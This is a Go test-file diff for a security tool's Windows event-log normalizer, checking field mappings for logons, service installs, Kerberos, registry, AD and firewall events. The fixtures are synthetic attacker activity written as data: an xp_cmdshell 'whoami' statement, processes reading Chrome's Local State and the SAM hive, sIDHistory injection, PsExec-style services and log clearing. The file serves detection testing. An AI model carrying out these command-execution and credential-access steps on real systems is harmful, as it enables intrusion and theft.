@@ -7,6 +7,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/jrsamsanchez/signalith/internal/search"
 	"github.com/jrsamsanchez/signalith/internal/store"
 )
 
@@ -36,6 +37,7 @@ func TestWindowsFailedLogon(t *testing.T) {
 	ins := make([]string, 21)
 	ins[5], ins[6], ins[7], ins[9], ins[10], ins[12], ins[13], ins[19], ins[20] =
 		"administrator", "CORP", "0xC000006D", "0xC000006A", "3", "NTLM", "KALI", "203.0.113.9", "51234"
+	ins[4], ins[11], ins[18] = "S-1-0-0", "NtLmSsp ", `C:\Windows\System32\svchost.exe`
 	b, _ := json.Marshal(map[string]any{
 		"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625,
 		"TimeCreated": "2026-10-11 10:00:00 +0000", "StringInserts": ins, "Message": "An account failed to log on.",
@@ -47,6 +49,7 @@ func TestWindowsFailedLogon(t *testing.T) {
 	expect(t, ev.Document(), map[string]any{
 		"action": "failure", "user": "administrator", "src": "203.0.113.9", "src_port": int64(51234),
 		"logon_type": int64(3), "logon_type_name": "network", "reason": "bad password",
+		"logon_process": "NtLmSsp", "user_sid": "S-1-0-0", "process_name": "svchost.exe",
 		"host": "DC01.corp.local", "signature_id": "4625", "sourcetype": "WinEventLog:Security",
 		"@timestamp": "2026-10-11T10:00:00Z", "datamodel": "Authentication",
 	})
@@ -63,12 +66,440 @@ func TestWindowsProcessCreation(t *testing.T) {
 	})
 }
 
+func TestWindowsScheduledTaskCreated(t *testing.T) {
+	task := `<?xml version="1.0" encoding="UTF-16"?><Task><Settings><Hidden>true</Hidden></Settings>` +
+		`<Actions><Exec><Command>C:\Users\Public\run.exe</Command><Arguments>-u http://x/?a=1&amp;b=2</Arguments></Exec></Actions></Task>`
+	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", `\Updater`, task}
+	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4698", "StringInserts": ins})
+	ev := Normalize("win.security", decode(t, string(b)), now)
+	expect(t, ev.Document(), map[string]any{
+		"datamodel": "Change", "action": "created", "object_category": "scheduled_task", "object": `\Updater`,
+		"task_name": `\Updater`, "task_content": task, "user": "bob", "user_domain": "CORP",
+		"task_command": `C:\Users\Public\run.exe`, "task_arguments": "-u http://x/?a=1&b=2",
+	})
+}
+
+func TestWindowsServiceInstalled(t *testing.T) {
+	ins := []string{"RemCom Service", `%systemroot%\RemComSvc.exe`, "user mode service", "demand start", "LocalSystem"}
+	rec := map[string]any{"Channel": "System", "Computer": "WS1", "EventID": "7045", "ProviderName": "Service Control Manager", "StringInserts": ins}
+	b, _ := json.Marshal(rec)
+	ev := Normalize("win.events", decode(t, string(b)), now)
+	expect(t, ev.Document(), map[string]any{
+		"datamodel": "Change", "action": "created", "object_category": "service", "object": "RemCom Service",
+		"service_name": "RemCom Service", "service_path": `%systemroot%\RemComSvc.exe`, "service_type": "user mode service",
+		"service_start_type": "demand start", "service_account": "LocalSystem", "provider": "Service Control Manager",
+		"sourcetype": "WinEventLog:System", "signature_id": "7045",
+	})
+	// Event IDs are their provider's: another provider's 7045 is not a
+	// service install.
+	rec["ProviderName"] = "Some-Driver"
+	b, _ = json.Marshal(rec)
+	if ev := Normalize("win.events", decode(t, string(b)), now); ev.Model != "Other" || ev.Fields["provider"] != "Some-Driver" {
+		t.Errorf("other provider = %s %v", ev.Model, ev.Fields)
+	}
+	// Wazuh sends the same event by name.
+	alert := `{"timestamp":"2026-10-14T10:00:00.000+0000","rule":{"id":"61138","level":5,"description":"New Windows Service Created"},"agent":{"id":"001","name":"WS1"},` +
+		`"data":{"win":{"system":{"providerName":"Service Control Manager","eventID":"7045","channel":"System","computer":"WS1","systemTime":"2026-10-14T10:00:00Z"},` +
+		`"eventdata":{"serviceName":"KrbSCM","imagePath":"C:\\Users\\Public\\krb.exe","serviceType":"user mode service","startType":"auto start","accountName":"LocalSystem"}}}}`
+	ev, ok := wazuhWindows(decode(t, alert))
+	if !ok || ev.Model != "Change" || ev.Fields["service_name"] != "KrbSCM" || ev.Fields["service_path"] != `C:\Users\Public\krb.exe` || ev.Fields["service_start_type"] != "auto start" {
+		t.Errorf("wazuh = %v %s %v", ok, ev.Model, ev.Fields)
+	}
+}
+
+func TestWindowsSystemEvents(t *testing.T) {
+	// A service stopped (7036): its data by name, in Other.
+	rec := map[string]any{"Channel": "System", "Computer": "WS1", "EventID": "7036", "ProviderName": "Service Control Manager",
+		"StringInserts": []string{"Microsoft Defender Antivirus Service", "stopped"}}
+	b, _ := json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "provider": "Service Control Manager", "signature_id": "7036", "signature": "A service changed state",
+		"system_param1": "Microsoft Defender Antivirus Service", "system_param2": "stopped",
+	})
+	// A log cleared (104): its account and the log.
+	rec = map[string]any{"Channel": "System", "Computer": "WS1", "EventID": "104", "ProviderName": "Microsoft-Windows-Eventlog",
+		"StringInserts": []string{"bob", "CORP", "Microsoft-Windows-Sysmon/Operational", ""}}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature": "An event log was cleared", "user": "bob", "user_domain": "CORP",
+		"system_subject_user_name": "bob", "system_channel": "Microsoft-Windows-Sysmon/Operational",
+	})
+	// The OpenTelemetry Collector sends the data by name, and the binary
+	// data.
+	body := map[string]any{"channel": "System", "computer": "WS1", "event_id": map[string]any{"id": "7034"},
+		"provider":   map[string]any{"name": "Service Control Manager"},
+		"event_data": map[string]any{"param1": "Message Queuing", "param2": "1", "binary": "4D0053004D005100"}}
+	ev := otlpWindows(body)
+	if ev.Fields["system_param1"] != "Message Queuing" || ev.Fields["system_param2"] != "1" || ev.Fields["system_binary"] != "4d0053004d005100" {
+		t.Errorf("otlp 7034 = %v", ev.Fields)
+	}
+	// Another provider's event of the same ID keeps no data.
+	rec = map[string]any{"Channel": "System", "Computer": "WS1", "EventID": "7036", "ProviderName": "Some-Driver", "StringInserts": []string{"x"}}
+	b, _ = json.Marshal(rec)
+	if ev := Normalize("win.events", decode(t, string(b)), now); ev.Fields["system_param1"] != nil {
+		t.Errorf("other provider = %v", ev.Fields)
+	}
+	// Every data field is in the index template.
+	for f := range systemDataFields {
+		if _, ok := knownFields[f]; !ok {
+			t.Errorf("%s is not a declared field", f)
+		}
+	}
+	if f, ok := SystemDataField("HiveName"); !ok || f != "system_hive_name" {
+		t.Errorf("SystemDataField(HiveName) = %s %v", f, ok)
+	}
+	if _, ok := SystemDataField("Nope"); ok {
+		t.Error("SystemDataField(Nope) is known")
+	}
+}
+
+func TestWindowsApplicationEvents(t *testing.T) {
+	// A SQL Server audit event: its data values one per line.
+	rec := map[string]any{"Channel": "Application", "Computer": "DB1", "EventID": "33205", "ProviderName": "MSSQLSERVER",
+		"StringInserts": []string{"audit_schema_version:1\nobject_name:xp_cmdshell\nstatement:EXEC xp_cmdshell 'whoami'", "", " "}}
+	b, _ := json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "provider": "MSSQLSERVER", "signature_id": "33205", "sourcetype": "WinEventLog:Application",
+		"event_data": "audit_schema_version:1\nobject_name:xp_cmdshell\nstatement:EXEC xp_cmdshell 'whoami'",
+	})
+	// Code Integrity's events the same way.
+	rec = map[string]any{"Channel": "Microsoft-Windows-CodeIntegrity/Operational", "Computer": "WS1", "EventID": "3001",
+		"ProviderName": "Microsoft-Windows-CodeIntegrity", "StringInserts": []string{"21", `\Device\HarddiskVolume3\x.sys`}}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "provider": "Microsoft-Windows-CodeIntegrity", "signature_id": "3001",
+		"event_data": "21\n\\Device\\HarddiskVolume3\\x.sys",
+	})
+	// The OpenTelemetry Collector's named values go in by name.
+	ev := otlpWindows(map[string]any{"channel": "Application", "computer": "WS1", "event_id": map[string]any{"id": "1040"},
+		"provider": map[string]any{"name": "MsiInstaller"}, "event_data": map[string]any{"param1": `C:\Users\Public\x.msi`, "param2": "(NULL)"}})
+	if ev.Fields["event_data"] != "C:\\Users\\Public\\x.msi\n(NULL)" || ev.Fields["provider"] != "MsiInstaller" {
+		t.Errorf("otlp application = %v", ev.Fields)
+	}
+}
+
+func TestWindowsFirewallAndBitsEvents(t *testing.T) {
+	// A firewall rule added on Windows 11 (2097), its data in template
+	// order, as SigmaHQ recorded it.
+	ins := make([]string, 28)
+	ins[0], ins[1], ins[3], ins[9] = "{503b3c4a-422a-49ff-a2a8-bf8e24605adf}", "RDPPORTLatest-TCP-In", "", "3"
+	ins[8], ins[21], ins[22] = "*", "S-1-5-21-1-2-3-1001", `C:\Windows\System32\wbem\WmiPrvSE.exe`
+	rec := map[string]any{"Channel": FirewallChannel, "Computer": "WS1", "EventID": "2097",
+		"ProviderName": "Microsoft-Windows-Windows Firewall With Advanced Security", "StringInserts": ins}
+	b, _ := json.Marshal(rec)
+	ev := Normalize("win.events", decode(t, string(b)), now)
+	expect(t, ev.Document(), map[string]any{
+		"datamodel": "Other", "signature_id": "2097", "sourcetype": "WinEventLog:" + FirewallChannel,
+		"signature": "A firewall rule was added", "firewall_rule_name": "RDPPORTLatest-TCP-In", "firewall_action": "3",
+		"firewall_remote_ports": "*", "firewall_modifying_user": "S-1-5-21-1-2-3-1001",
+		"firewall_modifying_application": `C:\Windows\System32\wbem\WmiPrvSE.exe`,
+	})
+	if _, ok := ev.Fields["firewall_application_path"]; ok {
+		t.Errorf("empty value kept: %v", ev.Fields)
+	}
+	// A BITS transfer started, from the OpenTelemetry Collector by name.
+	ev = otlpWindows(map[string]any{"channel": BitsChannel, "computer": "WS1", "event_id": map[string]any{"id": "16403"},
+		"provider": map[string]any{"name": "Microsoft-Windows-Bits-Client"}, "event_data": map[string]any{
+			"jobTitle": "myDownloadJob", "RemoteName": "https://www.7-zip.org/a/7z2301-x64.exe", "LocalName": `C:\Users\Public\7zip.exe`}})
+	if ev.Fields["bits_remote_name"] != "https://www.7-zip.org/a/7z2301-x64.exe" || ev.Fields["bits_local_name"] != `C:\Users\Public\7zip.exe` ||
+		ev.Fields["bits_job_title"] != "myDownloadJob" || ev.Fields["signature"] != "A BITS transfer started" {
+		t.Errorf("otlp bits = %v", ev.Fields)
+	}
+	// Every data field is in the index template.
+	for f := range namedChannelFields {
+		if _, ok := knownFields[f]; !ok {
+			t.Errorf("%s is not a declared field", f)
+		}
+	}
+	for name, want := range map[string]string{"ApplicationPath": "firewall_application_path", "applicationpath": "firewall_application_path",
+		"Store Type": "firewall_store_type", "RuleId": "firewall_rule_id"} {
+		if f, ok := ChannelDataField(FirewallChannel, name); !ok || f != want {
+			t.Errorf("ChannelDataField(%s) = %s %v", name, f, ok)
+		}
+	}
+	if f, ok := ChannelDataField(BitsChannel, "processPath"); !ok || f != "bits_process_path" {
+		t.Errorf("ChannelDataField(processPath) = %s %v", f, ok)
+	}
+	if _, ok := ChannelDataField(BitsChannel, "Nope"); ok {
+		t.Error("ChannelDataField(Nope) is known")
+	}
+	// Names that differ only in case are one field, as Sigma matches
+	// names without case.
+	for ch, c := range namedChannels {
+		seen := map[string]string{}
+		for _, e := range c.events {
+			for _, n := range e.data {
+				if f, ok := seen[strings.ToLower(n)]; ok && f != snakeField(c.prefix, n) {
+					t.Errorf("%s: %s is %s and %s", ch, n, f, snakeField(c.prefix, n))
+				}
+				seen[strings.ToLower(n)] = snakeField(c.prefix, n)
+			}
+		}
+	}
+	// Every log has its Sigma service.
+	for service, ch := range NamedChannelServices {
+		if !IsNamedChannel(ch) {
+			t.Errorf("%s: %s is not read by name", service, ch)
+		}
+	}
+	// An app package file downloaded (AppX 854).
+	rec = map[string]any{"Channel": AppxChannel, "Computer": "WS1", "EventID": "854",
+		"ProviderName": "Microsoft-Windows-AppXDeployment-Server", "StringInserts": []string{"https://example.org/app.msix"}}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature_id": "854", "appx_path": "https://example.org/app.msix",
+		"signature": "An app package file was downloaded",
+	})
+	// A Security event no data model holds (a filtering platform filter
+	// changed, 5447), by name, from Fluent Bit and the OpenTelemetry
+	// Collector alike.
+	ins = []string{"4242", "S-1-5-18", "NT AUTHORITY\\SYSTEM", "{p}", "Windows Defender", "1", "{f}", "Custom Outbound Filter"}
+	rec = map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "5447", "StringInserts": ins}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature_id": "5447", "security_filter_name": "Custom Outbound Filter",
+		"security_process_id": "4242", "signature": "A Windows Filtering Platform filter was changed",
+	})
+	ev = otlpWindows(map[string]any{"channel": "Security", "computer": "WS1", "event_id": map[string]any{"id": "4611"},
+		"event_data": map[string]any{"SubjectUserName": "alice", "SubjectDomainName": "CORP", "LogonProcessName": "User32LogonProcesss"}})
+	if ev.Fields["security_logon_process_name"] != "User32LogonProcesss" || ev.Fields["user"] != "alice" || ev.Fields["user_domain"] != "CORP" {
+		t.Errorf("otlp 4611 = %v", ev.Fields)
+	}
+	if IsNamedChannel("Security") || !IsNamedSecurityEvents("4611", "5447") || IsNamedSecurityEvents("4624") || IsNamedSecurityEvents() {
+		t.Error("Security events read by name")
+	}
+	// A Remote Desktop logon, its channel named in another case.
+	rec = map[string]any{"Channel": "Microsoft-Windows-TerminalServices-LocalSessionManager/operational", "Computer": "WS1",
+		"EventID": "21", "StringInserts": []string{`CORP\alice`, "2", "203.0.113.7"}}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature_id": "21", "rdp_user": `CORP\alice`, "rdp_session_id": "2", "rdp_address": "203.0.113.7",
+	})
+	// A scheduled task starting a process, from Fluent Bit; a DNS query
+	// from the OpenTelemetry Collector; a DNS Server event with no data.
+	rec = map[string]any{"Channel": TaskSchedulerChannel, "Computer": "WS1", "EventID": "129",
+		"StringInserts": []string{`\Updater`, `C:\Users\Public\run.exe`, "4242", "16384"}}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature_id": "129", "sourcetype": "WinEventLog:" + TaskSchedulerChannel,
+		"taskscheduler_task_name": `\Updater`, "taskscheduler_path": `C:\Users\Public\run.exe`,
+		"signature": "A scheduled task started a process",
+	})
+	ev = otlpWindows(map[string]any{"channel": DnsClientChannel, "computer": "WS1", "event_id": map[string]any{"id": "3008"},
+		"event_data": map[string]any{"QueryName": "userstorage.mega.co.nz", "QueryStatus": "0"}})
+	if ev.Fields["dnsclient_query_name"] != "userstorage.mega.co.nz" || ev.Fields["signature"] != "A DNS query completed" {
+		t.Errorf("otlp 3008 = %v", ev.Fields)
+	}
+	rec = map[string]any{"Channel": DnsServerChannel, "Computer": "DC1", "EventID": "6004", "StringInserts": []string{"203.0.113.9", "corp.example"}}
+	b, _ = json.Marshal(rec)
+	expect(t, Normalize("win.events", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Other", "signature_id": "6004", "sourcetype": "WinEventLog:DNS Server",
+	})
+	if f, ok := ChannelDataField(NtlmChannel, "workstationname"); !ok || f != "ntlm_workstation_name" {
+		t.Errorf("ntlm WorkstationName = %q %v", f, ok)
+	}
+}
+
+// The search engine knows every wildcard field, as it takes backslashes
+// in them literally.
+func TestWildcardFieldsKnownToSearch(t *testing.T) {
+	for f, typ := range knownFields {
+		if (typ == "wildcard") != search.WildcardFields[f] {
+			t.Errorf("%s is %s here, wildcard to search: %v", f, typ, search.WildcardFields[f])
+		}
+	}
+	for f := range search.WildcardFields {
+		if _, ok := knownFields[f]; !ok {
+			t.Errorf("search's wildcard field %s is not a field", f)
+		}
+	}
+}
+
+func TestWindowsSuccessfulLogon(t *testing.T) {
+	ins := make([]string, 27)
+	ins[0], ins[1], ins[2], ins[4], ins[5], ins[6], ins[8], ins[9], ins[10] =
+		"S-1-5-18", "WS1$", "CORP", "S-1-5-21-1", "bob", "CORP", "9", "seclogo", "Negotiate"
+	ins[15], ins[18], ins[20], ins[22], ins[23], ins[26] = "0", "::1", "%%1833", "admin", "OTHER", "%%1842"
+	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4624", "StringInserts": ins})
+	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Authentication", "action": "success", "user": "bob", "logon_type": int64(9), "logon_process": "seclogo",
+		"src_user": "WS1$", "src_user_sid": "S-1-5-18", "src_user_domain": "CORP", "key_length": int64(0),
+		"impersonation_level": "%%1833", "target_outbound_user": "admin", "target_outbound_domain": "OTHER",
+		"elevated_token": "%%1842",
+	})
+	// An older 4624 without the trailing values leaves them out.
+	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4624", "StringInserts": ins[:20]})
+	doc := Normalize("win.security", decode(t, string(b)), now).Document()
+	for _, k := range []string{"impersonation_level", "target_outbound_user", "elevated_token"} {
+		if _, ok := doc[k]; ok {
+			t.Errorf("%s set on an older 4624: %v", k, doc[k])
+		}
+	}
+}
+
+func TestWindowsSecurityServiceInstalled(t *testing.T) {
+	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", "PSEXESVC", `%SystemRoot%\PSEXESVC.exe`, "0x10", "3", "LocalSystem"}
+	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4697", "StringInserts": ins})
+	ev := Normalize("win.security", decode(t, string(b)), now)
+	expect(t, ev.Document(), map[string]any{
+		"datamodel": "Change", "action": "created", "object_category": "service", "object": "PSEXESVC", "user": "bob",
+		"service_name": "PSEXESVC", "service_path": `%SystemRoot%\PSEXESVC.exe`, "service_type": "0x10",
+		"service_start_type": "3", "service_account": "LocalSystem",
+	})
+	if _, ok := ev.Document()["client_process_id"]; ok {
+		t.Error("client_process_id set on an older 4697")
+	}
+	ins = append(ins, "0x1", "0", "604")
+	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4697", "StringInserts": ins})
+	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
+		"client_process_id": int64(0), "parent_process_id": int64(604),
+	})
+}
+
+func TestWindowsShareAccessAndDirectoryChange(t *testing.T) {
+	ins := []string{"S-1-5-7", "ANONYMOUS LOGON", "NT AUTHORITY", "0x3e6", "File", "198.51.100.7", "49702", `\\*\IPC$`, "", "lsarpc", "0x3", "%%1541 %%4416 %%4417"}
+	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": "5145", "StringInserts": ins})
+	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Filesystem", "action": "modified", "user": "ANONYMOUS LOGON", "src": "198.51.100.7", "src_port": int64(49702),
+		"share_name": `\\*\IPC$`, "share_target": "lsarpc", "file_name": "lsarpc", "access_list": "%%1541 %%4416 %%4417",
+		"access_names": "%%1541 %%4416 %%4417 SYNCHRONIZE ReadData WriteData", "access_mask": "0x3",
+	})
+	ins = []string{"{1}", "-", "S-1-5-21-1", "eve", "CORP", "0x1a2b", "corp.example.com", "%%14676", "CN=bob,CN=Users,DC=corp,DC=example,DC=com",
+		"{6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", "user", "sIDHistory", "2.5.5.17", "S-1-5-21-2-500", "%%14674"}
+	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": "5136", "StringInserts": ins})
+	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
+		"datamodel": "Change", "action": "modified", "object_category": "directory_object", "user": "eve",
+		"object": "CN=bob,CN=Users,DC=corp,DC=example,DC=com", "ad_object_class": "user", "ad_attribute": "sIDHistory",
+		"ad_value": "S-1-5-21-2-500", "ad_operation": "%%14674", "ad_object_guid": "6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10",
+	})
+}
+
+func TestWindowsObjectAccess(t *testing.T) {
+	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", "Security", "File", `C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State`,
+		"0x1f4", "%%4416\n\t\t\t\t", "0x1", "0x1092", `C:\Tools\steal.exe`}
+	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4663", "StringInserts": ins})
+	ev := Normalize("win.security", decode(t, string(b)), now)
+	expect(t, ev.Document(), map[string]any{
+		"datamodel": "Filesystem", "action": "read", "file_name": "Local State", "object_name": "Local State",
+		"object_type": "File", "access_list": "%%4416", "access_mask": "0x1", "process_name": "steal.exe", "process_id": int64(0x1092),
+	})
+	ins[5], ins[6], ins[8] = "Key", `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`, "%%4432 %%1537"
+	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4663", "StringInserts": ins})
+	ev = Normalize("win.security", decode(t, string(b)), now)
+	expect(t, ev.Document(), map[string]any{
+		"datamodel": "Registry", "action": "deleted", "registry_path": `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`,
+		"object_path": `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`,
+	})
+}
+
+func TestWindowsHandleRequestsAndRegistryValue(t *testing.T) {
+	sec := func(id string, ins []string) map[string]any {
+		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": id, "StringInserts": ins})
+		return Normalize("win.security", decode(t, string(b)), now).Document()
+	}
+	expect(t, sec("4656", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", "Security", "Key", `\REGISTRY\MACHINE\SAM`, "0x0", "{0}",
+		"%%1538 %%4432", "-", "0x20019", "-", "0", "0x1a4", `C:\Tools\dump.exe`}), map[string]any{
+		"datamodel": "Registry", "action": "read", "object_server": "Security", "object_type": "Key", "registry_path": `\REGISTRY\MACHINE\SAM`,
+		"access_mask": "0x20019", "process_path": `C:\Tools\dump.exe`, "process_id": int64(0x1a4), "signature": "A handle to an object was requested",
+	})
+	expect(t, sec("4661", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", "Security Account Manager", "SAM_USER", "S-1-5-21-1-500", "0x0", "{0}",
+		"%%5392\n\t\t\t\t", "0x2d", "-", "{a}\n\t{b}", "0", "0x2b4", `C:\Windows\System32\lsass.exe`}), map[string]any{
+		"object_server": "Security Account Manager", "object_type": "SAM_USER", "object_path": "S-1-5-21-1-500", "access_list": "%%5392",
+		"access_mask": "0x2d", "object_properties": "{a} {b}", "process_name": "lsass.exe",
+	})
+	expect(t, sec("4657", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa`,
+		"LmCompatibilityLevel", "0x1f0", "%%1905", "%%1876", "5", "%%1876", "2", "0x1a4", `C:\Windows\regedit.exe`}), map[string]any{
+		"datamodel": "Registry", "action": "modified", "object_path": `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa`,
+		"registry_path": `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\LmCompatibilityLevel`, "registry_key_name": "Lsa",
+		"registry_value_name": "LmCompatibilityLevel", "registry_old_value_data": "5", "registry_value_data": "2", "process_name": "regedit.exe",
+	})
+}
+
+func TestWindowsDirectoryAccessAndKerberos(t *testing.T) {
+	sec := func(id string, ins []string) map[string]any {
+		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": id, "StringInserts": ins})
+		return Normalize("win.security", decode(t, string(b)), now).Document()
+	}
+	expect(t, sec("4662", []string{"S-1-5-21-1", "eve", "CORP", "0x1a2b", "DS", "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
+		"%{6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", "Object Access", "0x0", "%%7688\n\t\t\t\t", "0x100",
+		"%%7688\n\t\t{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}"}), map[string]any{
+		"datamodel": "Change", "action": "read", "object_category": "directory_object", "object_server": "DS",
+		"object_type": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "object": "%{6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}",
+		"access_names": "%%7688 ControlAccess", "access_mask": "0x100",
+		"object_properties": "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}",
+	})
+	expect(t, sec("4768", []string{"bob", "CORP", "S-1-5-21-1-1104", "krbtgt", "S-1-5-21-1-502", "0x40810010", "0x0", "0x17", "0",
+		"::ffff:192.0.2.10", "50123", "", "", ""}), map[string]any{
+		"datamodel": "Authentication", "action": "success", "app": "win:kerberos", "user": "bob", "user_sid": "S-1-5-21-1-1104",
+		"kerberos_service": "krbtgt", "ticket_options": "0x40810010", "kerberos_status": "0x0", "ticket_encryption_type": "0x17",
+		"pre_auth_type": "0", "src": "192.0.2.10", "src_port": int64(50123),
+	})
+	expect(t, sec("4769", []string{"bob@CORP.EXAMPLE.COM", "CORP.EXAMPLE.COM", "MSSQLSvc", "S-1-5-21-1-1300", "0x40810000", "0x17",
+		"::ffff:192.0.2.10", "50124", "0x1b"}), map[string]any{
+		"datamodel": "Authentication", "action": "failure", "user": "bob@CORP.EXAMPLE.COM", "kerberos_service": "MSSQLSvc",
+		"ticket_encryption_type": "0x17", "kerberos_status": "0x1b", "src_port": int64(50124),
+	})
+}
+
+func TestWindowsExplicitCredentialsAndFilteringPlatform(t *testing.T) {
+	sec := func(id string, ins []string) map[string]any {
+		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": id, "StringInserts": ins})
+		return Normalize("win.security", decode(t, string(b)), now).Document()
+	}
+	expect(t, sec("4648", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", "{0}", "admin", "CORP", "{0}", "fs1.corp.example.com",
+		"fs1.corp.example.com", "0x1a4", `C:\Windows\System32\cmd.exe`, "-", "-"}), map[string]any{
+		"datamodel": "Authentication", "src_user": "bob", "user": "admin", "dest": "fs1.corp.example.com",
+		"process_name": "cmd.exe", "signature": "A logon was attempted using explicit credentials",
+	})
+	expect(t, sec("5157", []string{"4242", `\device\harddiskvolume2\program files\vendor\agent.exe`, "%%14593", "10.0.0.5", "50123",
+		"203.0.113.9", "443", "6", "70413", "%%14611", "48"}), map[string]any{
+		"datamodel": "Network_Traffic", "action": "blocked", "direction": "outbound", "transport": "tcp", "process_name": "agent.exe",
+		"src": "10.0.0.5", "dest": "203.0.113.9", "dest_port": int64(443), "layer_rtid": "48",
+	})
+}
+
+func TestWindowsAccountAndAuditPolicyChanges(t *testing.T) {
+	sec := func(id string, ins []string) map[string]any {
+		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": id, "StringInserts": ins})
+		return Normalize("win.security", decode(t, string(b)), now).Document()
+	}
+	ins := []string{"-", "jdoe", "CORP", "S-1-5-21-1-1201", "S-1-5-21-1-500", "admin", "CORP", "0x967cf92", "-", "-", "-", "-", "-", "-",
+		"-", "-", "-", "-", "-", "-", "-", "0x10", "0x10010", "\r\n\t\t%%2096", "-", "-", "%%1793"}
+	expect(t, sec("4738", ins), map[string]any{
+		"datamodel": "Change", "action": "modified", "object_category": "user", "object": "jdoe", "object_sid": "S-1-5-21-1-1201",
+		"user": "admin", "old_uac_value": "0x10", "new_uac_value": "0x10010", "user_account_control": "%%2096",
+	})
+	expect(t, sec("4720", ins[1:]), map[string]any{"action": "created", "object": "jdoe", "user": "admin", "user_domain": "CORP"})
+	expect(t, sec("4732", []string{"-", "S-1-5-21-1-1201", "DnsAdmins", "CORP", "S-1-5-21-1-1101", "S-1-5-21-1-500", "admin", "CORP", "0x1"}), map[string]any{
+		"object_category": "group", "object": "DnsAdmins", "member_sid": "S-1-5-21-1-1201", "user": "admin", "object_sid": "S-1-5-21-1-1101",
+	})
+	expect(t, sec("4719", []string{"S-1-5-18", "DC1$", "CORP", "0x3e7", "%%8274", "%%12801", "{0CCE9215-69AE-11D9-BED3-505054503030}", "%%8448, %%8450"}), map[string]any{
+		"object_category": "audit_policy", "audit_subcategory_guid": "{0CCE9215-69AE-11D9-BED3-505054503030}",
+		"audit_policy_changes": "%%8448, %%8450", "user": "DC1$",
+	})
+}
+
 func TestSysmonProcessHashes(t *testing.T) {
 	msg := "Process Create:\r\nImage: C:\\Users\\bob\\evil.exe\r\nCommandLine: evil.exe\r\nUser: CORP\\bob\r\nHashes: SHA1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,MD5=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,IMPHASH=DD"
 	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1, "Message": msg})
 	ev := Normalize("win.sysmon", decode(t, string(b)), now)
 	expect(t, ev.Document(), map[string]any{
 		"process_md5": strings.Repeat("b", 32), "process_sha1": strings.Repeat("a", 40), "process_sha256": strings.Repeat("c", 64),
+	})
+}
+
+// Sysmon's file blocks are file events; its configuration changing stays in
+// Other.
